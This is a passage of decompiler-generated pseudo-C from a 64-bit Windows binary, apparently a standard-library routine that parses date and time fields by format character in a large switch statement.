0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x140035607;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                puVar4 = *(ppiVar78 + 0x290);\n                uVar2 = *(ppiVar78 + 0xdc);\n                *puVar4 = *puVar4 | 0x480;\n                *(puVar4 + 2) = uVar2;\n            }\n            goto code_r0x0001400340c1;\n        case '\\x1f':\n            pcVar3 = (*unaff_R12)[0xb];\n            *(ppiVar78 + -8) = 0x1400352e8;\n            (*pcVar3)(unaff_R12, 0x1400fe1a4, 0x1400fe1ad, ppiVar78 + 0xe0);\n            *(ppiVar78 + 0x38) = ppiVar78 + 0xe0;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x290);\n            goto code_r0x000140035328;\n        case '#':\n            *(ppiVar78 + 0x30) = 0x17;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x14003543e;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 8) = *(ppiVar78 + 0xdc);\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) & 0xfe;\n            }\n            goto code_r0x0001400340c1;\n        case '$':\n            *(ppiVar78 + 0x30) = 0xc;\n            *(ppiVar78 + 0x28) = 1;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x140034fc1;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                iVar85 = *(ppiVar78 + 0xdc);\n                iVar67 = iVar85;\ncode_r0x000140035002:\n                *(*(ppiVar78 + 0x280) + 8) = iVar85 + ((iVar67 * 0x2aaaaaab >> 0x21) - (iVar85 >> 0x1f)) * -0xc;\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 1;\n            }\n            goto code_r0x0001400340c1;\n        case '(':\n            *(ppiVar78 + 0x30) = 0x3b;\n            in_stack_00000038 = ppiVar78 + 0x90;\n            puVar66 = ppiVar78 + 0xb0;\n            *(ppiVar78 + 0x28) = 0;\n            arg3 = *(ppiVar78 + 600);\n            in_stack_00000030 = ppiVar78 + 0xa0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            ppiVar60 = ppiVar78 + 0xd8;\n            auVar93 = *(ppiVar78 + 0xc0);\ncode_r0x000140034eac:\n            *(ppiVar78 + 0x48) = ppiVar60;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = auVar93;\n            *(ppiVar78 + -8) = 0x140034ee9;\n            fcn.140032a40(puVar66, arg3, in_stack_00000030, in_stack_00000038);\n            in_stack_00000038 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            ppiVar60 = *(ppiVar78 + 0xd8);\n            *(ppiVar78 + 0xc0) = in_stack_00000038;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            ppiVar41 = ppiVar78;\ncode_r0x000140034f13:\n            ppiVar78 = ppiVar41;\n            unaff_R13 = in_stack_00000038;\n            if (ppiVar60 == 0) {\n                *(*(ppiVar78 + 0x280) + 4) = *(ppiVar78 + 0xdc);\n            }\n            goto code_r0x0001400340c1;\n        case '-':\n            unaff_RSI = ppiVar78 + 0xe0;\n            pcVar3 = (*unaff_R12)[0xb];\n            *(ppiVar78 + -8) = 0x140034e40;\n            (*pcVar3)(unaff_R12, 0x1400fe1ad, 0x1400fe1b3, unaff_RSI);\n            puVar66 = ppiVar78 + 0xb0;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            goto code_r0x000140034cab;\n        case '.':\n            uVar59 = *(ppiVar78 + 0x78);\ncode_r0x000140034d4e:\n            *(ppiVar78 + 0x30) = 0x3c;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = uVar59;\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x140034dd4;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                **(ppiVar78 + 0x280) = *(ppiVar78 + 0xdc);\n            }\n            goto code_r0x0001400340c1;\n        case '/':\ncode_r0x000140034c72:\n            unaff_RSI = ppiVar77 + 0xe0;\n            pcVar3 = (*unaff_R12)[0xb];\n            *(ppiVar77 + -8) = 0x140034c92;\n            (*pcVar3)(unaff_R12, 0x1400fe1b3, 0x1400fe1bc, unaff_RSI);\n            puVar66 = ppiVar77 + 0xb0;\n            *(ppiVar77 + 0xa0) = *(ppiVar77 + 0xc0);\n            *(ppiVar77 + 0xa4) = *(ppiVar77 + 0xc4);\n            *(ppiVar77 + 0xa8) = *(ppiVar77 + 200);\n            *(ppiVar77 + 0xac) = *(ppiVar77 + 0xcc);\n            ppiVar78 = ppiVar77;\ncode_r0x000140034cab:\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0x38) = unaff_RSI;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x290);\n            goto code_r0x000140034cd2;\n        case '0':\n            *(ppiVar78 + 0x30) = 0x35;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x140034c03;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            in_stack_00000038 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = in_stack_00000038;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            unaff_R13 = in_stack_00000038;\n            if (*(ppiVar78 + 0xd8) == 0) {\ncode_r0x000140034c36:\n                uVar51 = **(ppiVar78 + 0x290);\n                *(ppiVar78 + 0x70) = uVar51;\n                **(ppiVar78 + 0x290) = (*(ppiVar78 + 0xdc) & 0x3f) << 0x10 | 0x20 | uVar51 & 0xffc0ffdf;\n                unaff_R13 = in_stack_00000038;\n            }\n            goto code_r0x0001400340c1;\n        case '2':\n            ppiVar60 = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x30) = 0x35;\n            in_stack_00000038 = ppiVar78 + 0x90;\ncode_r0x000140034a93:\n            puVar66 = ppiVar78 + 0xb0;\n            *(ppiVar78 + 0x28) = 0;\n            arg3 = *(ppiVar78 + 600);\n            in_stack_00000030 = ppiVar78 + 0xa0;\n            *(ppiVar78 + 0x98) = ppiVar60;\n            in_XMM1_Da = *(ppiVar78 + 0xc0);\n            in_XMM1_Db = *(ppiVar78 + 0xc4);\n            in_XMM1_Dc = *(ppiVar78 + 200);\n            in_XMM1_Dd = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            ppiVar60 = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x38) = 2;\ncode_r0x000140034ae2:\n            *(ppiVar78 + 0x40) = ppiVar60;\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = in_XMM1_Da;\n            *(ppiVar78 + 0xa4) = in_XMM1_Db;\n            *(ppiVar78 + 0xa8) = in_XMM1_Dc;\n            *(ppiVar78 + 0xac) = in_XMM1_Dd;\n            *(ppiVar78 + -8) = 0x140034b09;\n            fcn.140032a40(puVar66, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                uVar51 = **(ppiVar78 + 0x290);\n                *(ppiVar78 + 0x70) = uVar51;\n                **(ppiVar78 + 0x290) = (*(ppiVar78 + 0xdc) & 0x3f) << 0x10 | 0x40 | uVar51 & 0xffc0ffbf;\n            }\n            goto code_r0x0001400340c1;\n        case '3':\n            puVar66 = ppiVar78 + 0xb0;\n            uVar58 = *(*(*(ppiVar78 + 0x80) + 0x10) + 0x20);\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            break;\n        case '4':\n            *(ppiVar78 + 0x30) = 9999;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 4;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x1400358cb;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 0x14) = *(ppiVar78 + 0xdc) + -0x76c;\n                uVar43 = *(*(ppiVar78 + 0x290) + 1);\n                *(ppiVar78 + 0x70) = uVar43;\n                *(*(ppiVar78 + 0x290) + 1) = uVar43 & 0xf9 | 4;\n            }\n            goto code_r0x0001400340c1;\n        case '5':\n            piVar55 = *(ppiVar78 + 0xc0);\n            if ((piVar55 != NULL) && (uVar43 != 0)) {\n                if (piVar55[2] < piVar55[3]) {\n                    iVar47 = *piVar55[2];\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x48);\n                    *(ppiVar78 + -8) = 0x140035f57;\n                    iVar47 = (*pcVar3)();\n                }\n                if (iVar47 == -1) {\n                    *(ppiVar78 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(ppiVar78 + -8) = 0x1400356d7;\n            cVar42 = (*pcVar3)(unaff_R12);\n            if (cVar42 != '\\0') {\n                unaff_R13 = ppiVar78 + 0xd8;\n                unaff_R14 = ppiVar78 + 0xe0;\n                *(ppiVar78 + 0x30) = 0xe;\n                *(ppiVar78 + 0x40) = unaff_R13;\n                arg3 = *(ppiVar78 + 600);\n                in_stack_00000038 = ppiVar78 + 0x90;\n                puVar66 = ppiVar78 + 0xb0;\n                *(ppiVar78 + 0x20) = unaff_R14;\n                in_stack_00000030 = ppiVar78 + 0xa0;\n                in_XMM1_Da = *(ppiVar78 + 0xc0);\n                in_XMM1_Db = *(ppiVar78 + 0xc4);\n                in_XMM1_Dc = *(ppiVar78 + 200);\n                in_XMM1_Dd = *(ppiVar78 + 0xcc);\n                *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n                *(ppiVar78 + 0x88) = puVar66;\n                *(ppiVar78 + 0x38) = *(ppiVar78 + 0x270);\n                uVar59 = *0x140102cf0;\n                unaff_R15 = in_stack_00000038;\ncode_r0x000140035757:\n                *(ppiVar78 + 0x90) = unaff_RDI;\n                *(ppiVar78 + 0x28) = uVar59;\n                *(ppiVar78 + 0x70) = in_stack_00000030;\n                *(ppiVar78 + 0xa0) = in_XMM1_Da;\n                *(ppiVar78 + 0xa4) = in_XMM1_Db;\n                *(ppiVar78 + 0xa8) = in_XMM1_Dc;\n                *(ppiVar78 + 0xac) = in_XMM1_Dd;\n                *(ppiVar78 + -8) = 0x140035776;\n                fcn.140032f70(puVar66, arg3, in_stack_00000030, in_stack_00000038, *(ppiVar78 + 0x20), \n                              *(ppiVar78 + 0x28), *(ppiVar78 + 0x30), *(ppiVar78 + 0x38), *(ppiVar78 + 0x40), \n                              *(ppiVar78 + 0x48), *(ppiVar78 + 0x50), *(ppiVar78 + 0x58), *(ppiVar78 + 0x60), \n                              *(ppiVar78 + 0x68), *(ppiVar78 + 0x70), *(ppiVar78 + 0x78), *(ppiVar78 + 0x80));\n                uVar49 = *(ppiVar78 + 0xb8);\n                unaff_RSI = uVar49;\n                piVar55 = *(ppiVar78 + 0xb0);\n                cVar42 = uVar49 == 0xffff;\n                *(ppiVar78 + 0xc0) = piVar55;\n                *(ppiVar78 + 200) = uVar49;\n                if ((piVar55 != NULL) && (cVar42)) {\n                    if (piVar55[2] < piVar55[3]) {\n                        iVar47 = *piVar55[2];\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x48);\n                        *(ppiVar78 + -8) = 0x140036122;\n                        iVar47 = (*pcVar3)();\n                    }\n                    if (iVar47 == -1) {\n                        *(ppiVar78 + 0xc0) = 0;\n                    }\n                    cVar42 = iVar47 == -1;\n                }\n                cVar65 = unaff_RBP;\n                if (cVar65 == '\\0') {\n                    cVar65 = arg1;\n                }\n                else {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar47 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar55 = *unaff_RDI;\n                        *(ppiVar78 + 100) = cVar42;\n                        pcVar3 = piVar55[9];\n                        *(ppiVar78 + -8) = 0x140036103;\n                        iVar47 = (*pcVar3)(unaff_RDI);\n                        cVar42 = *(ppiVar78 + 100);\n                    }\n                    if (iVar47 == -1) {\n                        unaff_RDI = NULL;\n                    }\n                    else {\n                        cVar65 = '\\0';\n                    }\n                }\n                *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n                if ((cVar42 != cVar65) && ((*(ppiVar78 + 0xd8) | *(ppiVar78 + 0xe0)) == 0)) {\n                    *(ppiVar78 + -8) = 0x1400357e8;\n                    iVar47 = fcn.1400240d0(ppiVar78 + 0xc0);\n                    pcVar3 = (*unaff_R12)[10];\n                    *(ppiVar78 + -8) = 0x1400357f9;\n                    iVar48 = (*pcVar3)(unaff_R12, 0x2d);\n                    if (iVar47 != iVar48) {\n                        *(ppiVar78 + -8) = 0x14003580a;\n                        iVar47 = fcn.1400240d0(ppiVar78 + 0xc0);\n                        pcVar3 = (*unaff_R12)[10];\n                        *(ppiVar78 + -8) = 0x14003581b;\n                        iVar48 = (*pcVar3)(unaff_R12);\n                        if (iVar47 != iVar48) {\n                            unaff_RSI = *(ppiVar78 + 200);\n                            *(ppiVar78 + 100) = 0;\n                            goto code_r0x0001400350c4;\n                        }\n                    }\n                    uVar58 = *(ppiVar78 + 0x88);\n                    *(ppiVar78 + 0x48) = unaff_R13;\n                    *(ppiVar78 + 0x28) = 0;\n                    uVar5 = *(ppiVar78 + 0x78);\n                    *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n                    *(ppiVar78 + 0x30) = 0x17;\n                    *(ppiVar78 + 0x20) = unaff_R14;\n                    *(ppiVar78 + 0x38) = 2;\n                    *(ppiVar78 + 0x98) = uVar5;\n                    *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n                    *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n                    *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n                    *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n                    *(ppiVar78 + 0x90) = unaff_RDI;\n                    *(ppiVar78 + -8) = 0x14003600d;\n                    fcn.140032a40(uVar58, *(ppiVar78 + 600), *(ppiVar78 + 0x70), unaff_R15);\n                    *(ppiVar78 + 0x48) = unaff_R13;\n                    *(ppiVar78 + 0x28) = 0;\n                    *(ppiVar78 + 0x38) = 2;\n                    *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n                    *(ppiVar78 + 0x30) = 0x3b;\n                    *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n                    *(ppiVar78 + 0x20) = unaff_R14;\n                    *(ppiVar78 + 0xc0) = *(ppiVar78 + 0xb0);\n                    *(ppiVar78 + 0x98) = uVar5;\n                    *(ppiVar78 + 0x90) = unaff_RDI;\n                    *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n                    *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n                    *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n                    *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n                    *(ppiVar78 + -8) = 0x140036096;\n                    fcn.140032a40(uVar58, *(ppiVar78 + 600), *(ppiVar78 + 0x70), unaff_R15);\n                    unaff_RSI = *(ppiVar78 + 0xb8);\n                    *(ppiVar78 + 0xc0) = *(ppiVar78 + 0xb0);\n                    *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n                    *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n                }\n                goto code_r0x0001400350c4;\n            }\n            goto code_r0x0001400340a6;\n        case '>':\n            uVar58 = *(*(*(ppiVar78 + 0x80) + 0x10) + 0x30);\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0x38) = uVar58;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x290);\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\ncode_r0x000140035328:\n            *(ppiVar78 + 0x30) = *(ppiVar78 + 0x280);\n            *(ppiVar78 + 0x28) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x20) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + -8) = 0x14003536c;\n            fcn.140033e90(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            in_stack_00000038 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = in_stack_00000038;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            unaff_R13 = in_stack_00000038;\n            if (*(ppiVar78 + 0xd8) == 0) {\ncode_r0x00014003539f:\n                *(*(ppiVar78 + 0x290) + 1) = *(*(ppiVar78 + 0x290) + 1) | 4;\n                unaff_R13 = in_stack_00000038;\n            }\n            goto code_r0x0001400340c1;\n        case '?':\n        case '@':\n            piVar55 = *(ppiVar78 + 0xc0);\n            if ((piVar55 != NULL) && (uVar43 != 0)) {\n                if (piVar55[2] < piVar55[3]) {\n                    iVar47 = *piVar55[2];\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x48);\n                    *(ppiVar78 + -8) = 0x140035f80;\n                    iVar47 = (*pcVar3)();\n                }\n                if (iVar47 == -1) {\n                    *(ppiVar78 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(ppiVar78 + -8) = 0x1400346fc;\n            cVar42 = (*pcVar3)(unaff_R12, 0x20, iVar47);\n            if (cVar42 != '\\0') {\n                piVar55 = *(ppiVar78 + 0xc0);\n                if (piVar55[2] < piVar55[3]) {\n                    piVar55[2] = piVar55[2] + 2;\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x50);\n                    *(ppiVar78 + -8) = 0x140035ee8;\n                    (*pcVar3)();\n                }\n                *(ppiVar78 + 200) = 0xffff;\n            }\n            *(ppiVar78 + 0x30) = 0x1f;\n            in_stack_00000038 = ppiVar78 + 0x90;\n            puVar66 = ppiVar78 + 0xb0;\n            *(ppiVar78 + 0x28) = 1;\n            arg3 = *(ppiVar78 + 600);\n            in_stack_00000030 = ppiVar78 + 0xa0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            in_XMM5_Da = *(ppiVar78 + 0xc0);\n            in_XMM5_Db = *(ppiVar78 + 0xc4);\n            in_XMM5_Dc = *(ppiVar78 + 200);\n            in_XMM5_Dd = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\ncode_r0x00014003477a:\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = in_XMM5_Da;\n            *(ppiVar78 + 0xa4) = in_XMM5_Db;\n            *(ppiVar78 + 0xa8) = in_XMM5_Dc;\n            *(ppiVar78 + 0xac) = in_XMM5_Dd;\n            *(ppiVar78 + -8) = 0x14003478f;\n            fcn.140032a40(puVar66, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 0xc) = *(ppiVar78 + 0xdc);\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 0x410;\n            }\n            goto code_r0x0001400340c1;\n        case 'E':\n            *(ppiVar78 + 0x30) = 0x16e;\n            *(ppiVar78 + 0x28) = 1;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 3;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x14003526d;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                puVar66 = *(ppiVar78 + 0x280);\n                *(puVar66 + 0x1c) = *(ppiVar78 + 0xdc) + -1;\n                ppiVar79 = ppiVar78;\ncode_r0x0001400352aa:\n                *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + puVar66;\n                pcVar3 = swi(0x83);\n                (*pcVar3)();\n                ppiVar78 = ppiVar79 + 1;\n                *ppiVar79 = 0x1400352b8;\n                func_0x00015c44dbb9();\n                *ppiVar79[0x53] = *ppiVar79[0x53] | 4;\n            }\n            goto code_r0x0001400340c1;\n        case 'H':\n            *(ppiVar78 + 0x30) = 0xc;\n            in_stack_00000038 = ppiVar78 + 0x90;\n            puVar66 = ppiVar78 + 0xb0;\n            *(ppiVar78 + 0x28) = 1;\n            arg3 = *(ppiVar78 + 600);\n            in_stack_00000030 = ppiVar78 + 0xa0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            pcVar53 = ppiVar78 + 0xd8;\n            in_XMM5_Da = *(ppiVar78 + 0xc0);\n            in_XMM5_Db = *(ppiVar78 + 0xc4);\n            in_XMM5_Dc = *(ppiVar78 + 200);\n            in_XMM5_Dd = *(ppiVar78 + 0xcc);\ncode_r0x0001400354e4:\n            *(ppiVar78 + 0x48) = pcVar53;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = in_XMM5_Da;\n            *(ppiVar78 + 0xa4) = in_XMM5_Db;\n            *(ppiVar78 + 0xa8) = in_XMM5_Dc;\n            *(ppiVar78 + 0xac) = in_XMM5_Dd;\n            